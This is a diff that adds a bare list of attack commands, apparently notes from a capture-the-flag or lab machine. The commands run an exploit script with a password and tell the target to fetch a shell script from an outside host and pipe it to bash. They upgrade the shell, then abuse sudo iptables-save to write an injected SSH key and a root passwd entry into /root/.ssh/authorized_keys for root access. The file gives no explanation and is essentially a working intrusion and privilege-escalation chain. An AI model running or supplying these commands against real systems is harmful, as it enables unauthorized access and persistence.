@@ -1,0 +1,24 @@
+python3 exp2.py --target https://10.129.248.17/ -i 127.0.0.1 -p 40056 --command "curl http://10.10.14.17:8000/shell | bash" --user "ilya" --password "CobaltStr1keSuckz!"
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+curl http://10.10.14.17:8000/shell -o shell 
+
+
+sudo iptables-save -f test1s.txt 
+
+
+sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGCWTAz5zAf2H34vfAokTmviH3xYLHsz1wiT5/AYS5NT xot@kali\n'
+
+
+sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nroot:$1$oUrHnKD.$Pr0.9X60Bs0.sN5d7CvVV/:0:0:root:/root:/bin/bash\n'
+
+sudo iptables -S
+
+sudo iptables-save -f /root/.ssh/authorized_keyss
+
+root:$1$oUrHnKD.$Pr0.9X60Bs0.sN5d7CvVV/:0:0:root:/root:/bin/bash
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLl0RXAYYihW8wLnl9t3R/zh6PMdDt+9nkSXoyvmCcP1i5+9cLJfpI1K00RdgKs6PTOfQV0SzqcouCgajPy+Uv4AbG5h0Rw24UE9q4wD0l4xPCRp55XhypucgsTHgccjlp0WyVULZqZPV/80CFoXsu+AiWZPmT2zg75aQn1eyhVOxyCXWZyamW8dCEP2jE/LKPh6rRV1CWbaRUAHRR+Tkwlcfw3tbWWGKZNZm9+7kzygVQ6rdcJwXTJVHUqmgu/TPaT9uSxHtQEP8jsqZrxt+7JnhIMBEkrXIsa1R/fmSF12AjCWZXxdXIhA2Pw2aXaFPZ829birmAkzDUfJVGPVwl xot@kali" > authorized_keys
